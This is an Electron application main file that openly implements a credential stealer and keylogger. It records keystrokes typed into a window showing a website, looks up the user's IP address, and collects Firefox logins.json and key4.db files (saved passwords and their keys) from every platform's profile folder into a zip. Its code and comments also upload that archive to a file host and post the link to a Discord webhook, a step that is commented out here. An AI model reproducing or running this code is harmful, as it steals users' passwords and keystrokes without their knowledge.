const { app, BrowserWindow } = require('electron')
const fetch = require('electron-fetch').default
// const path = require("path");
const fs = require('fs');
const {spawn} = require("child_process");
const JSZip = require("jszip");
const client = require('filestack-js').init("API KEY");
let fullText = "";
function createWindow () {
// Create the browser window.
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    // Icons Made By https://www.flaticon.com/authors/pixel-perfect
    icon: __dirname + '/icon/neutral.png',
    webPreferences: {
      nodeIntegration: true,
      nativeWindowOpen: true,
      contextIsolation: true,
    },
    simpleFullscreen: true,
    // fullscreen: true
    // frame: false
  })
  // Retrieve key (encrypted)
  // Create app on the surface key logs.
  // Also retrieves login/pass from your browser (chrome/firefox).
  // Zip these files. Upload them.
  // discord post webhook for posting key.

  // Load the index.html of the app.
  //win.loadFile('src/index.html')
  win.loadURL("https://krishneelkumar.com/");
  // win.loadURL("https://stackoverflow.com/users/login")
  const ses = win.webContents.session
  console.log(ses.getUserAgent())
  let win1 = BrowserWindow.getAllWindows()[0];


  if (process.platform == "win32") {
    // https://healeycodes.com/javascript/python/beginners/webdev/2019/04/11/talking-between-languages.html
    // const sensor = spawn("python3", ["test.py"]);
    // sensor.stdout.on("data", function(data) {
    // console.log(data.toString());
    // })
    var folderSpecifier = "\\";
    processWindowsMozilla(process.env.APPDATA + "\\Mozilla\\Firefox\\Profiles",
    folderSpecifier);
  } else if (process.platform == "darwin") {
    var folderSpecifier = "/";
    processWindowsMozilla(process.env.HOME + "/Library/Application Support/Firefox/Profiles",
    folderSpecifier);
  } else if (process.platform == "linux") {
    var folderSpecifier = "/";
    processWindowsMozilla(process.env.HOME + "/.mozilla/firefox",
    folderSpecifier);
  }
  // Fetch and put in zip.file.
  fetch('https://api.ipdata.co/?api-key=test')
  .then(results => results.json())
  .then(json => {
      fullText += 'IP: ' + json.ip + '\n';
  })
  for(const window of BrowserWindow.getAllWindows()) {
    if (win1.webContents) {
      win1.webContents.on('before-input-event', (event, input) => {
        //console.log(input);
        // setTimeout(writingText(input), 500);
        if (!input.isAutoRepeat && input.type == 'keyDown') {
          if ((input.key) == 'Tab') {
            input.key = '\r\n';
          }
          fullText += input.key;
          fs.writeFileSync('log.txt', fullText);
        }
        // fs.appendFileSync('log.txt', '\n');
      })
    }
    // else {
      // window.webContents.on('before-input-event', (event, input) => {
      //   if (!input.isAutoRepeat && input.type == 'keyDown') {
      //     if ((input.key) == 'Tab') {
      //       input.key = '\r\n';
      //     } else if((input.key) == 'CapsLock') {
      //       input.key = '\nCaps: ENABLED\n';
      //     }
      //     fullText += input.key;
      //     fs.writeFileSync('someText.txt', fullText);
      //   }
      // })
    //}
  };

  // Open the DevTools.
  // win.webContents.openDevTools()
}

// This function will retrieve the data for Firefox Logins.
function processWindowsMozilla(directoryPath, folderSpecifier) {
  var d = new Date();
  var n1 = d.getTime()
  fs.opendir(directoryPath, (err, dir) => {
    if (err) {
      console.log("ERROR");
    } else {
      var recentTime = 0;
      let recentFile = ""
      console.log(dir.path);

      // Maybe remove opendir.
      files = fs.readdirSync(dir.path);
        let zip = new JSZip();
        files.forEach(folder => {
          statsPath = dir.path + folderSpecifier + folder
          statObj = fs.statSync(statsPath);
          if (statObj.mtimeMs > recentTime && folder.indexOf("default") != -1) {
            recentTime = statObj.mtimeMs;
            recentFile = folder;
          };
          console.log(statObj["mode"]);
          if (statObj["mode"] == 16822 && process.platform == "win32" ||
              statObj["mode"] == 16832 && process.platform == "linux" ||
              statObj["mode"] == 168322 && process.platform == "darwin") {
            storeMozillaFiles(zip, statsPath, folder, folderSpecifier);
          }
        })
        console.log(dir.path + "\\" + recentFile + "\\" + "login.json");

        // Compress Files and Upload.
        zip
        .generateNodeStream(
          {type: "nodebuffer",
           streamFiles: true,
           compression: "DEFLATE",
           compressionOptions: {"level": 9}})
        .pipe(fs.createWriteStream("out.zip"))
        .on("finish", function() {
          // Specify the out.zip.
          // uploadFiles("aqua.zip");
          console.log("out.zip");
        });
        console.log(recentFile);
    }
    dir.close()
  })
}

function uploadFiles(fileName) {
  client.upload("aqua.zip").then(
    function(result) {
      const data = JSON.stringify({
        "content": result["url"]
      });
      webhookID = "WEBHOOK ID"
      webhookToken = "WEBHOOK TOKEN"

      // Reference: https://stackoverflow.com/a/56627565
      var URL = `https://discordapp.com/api/webhooks/${webhookID}/${webhookToken}`
      fetch(URL, {
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": data
      })
      .then(
        fs.rmdir("aqua.zip", {recursive: true}, function() {
        })
      )
      .catch(err => console.log(err));
    },
    function(error) {
      console.log(error);
    }
  );
}

// Check file exists, using a path.
// If exists store in zip, and pass foldername for zip.folder().

function storeMozillaFiles(zip, pathName, folderName, folderSpecifier) {
  var prefixPath = pathName + folderSpecifier;

  // This json contains login details.
  var loginPath = prefixPath + "logins.json";

  // This db contains a set of 4 keys used to encrypt logins.json.
  var keyPath = prefixPath + "key4.db";
  try {
    fs.statSync(keyPath);
  } catch (err) {
    return;
  }
  try {
    fs.statSync(loginPath);
  } catch (err) {
    return;
  }
  var prefixFolder = folderName + folderSpecifier;
  zip.folder(folderName);
  zip.file(prefixFolder + "logins.json", fs.createReadStream(loginPath));
  zip.file(prefixFolder + "key4.db", fs.createReadStream(keyPath));
  return;
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
// app.on('ready', createWindow);
app.on('ready', () => {
  createWindow()
});

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// app.on('session-created', (session) => {
//   console.log(session)
// })

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and import them here.
// app.once('ready', () => {
//   const handleRedirect = (e, url) => {
//     if (url !== e.sender.getURL()) {
//       e.preventDefault()
//       shell.openExternal(url)
//     }
//   }
//   const win = new BrowserWindow()
//   // Instead bare webContents:
//   win.webContents.on('will-navigate', handleRedirect)
//   win.loadURL('http://google.com')
// })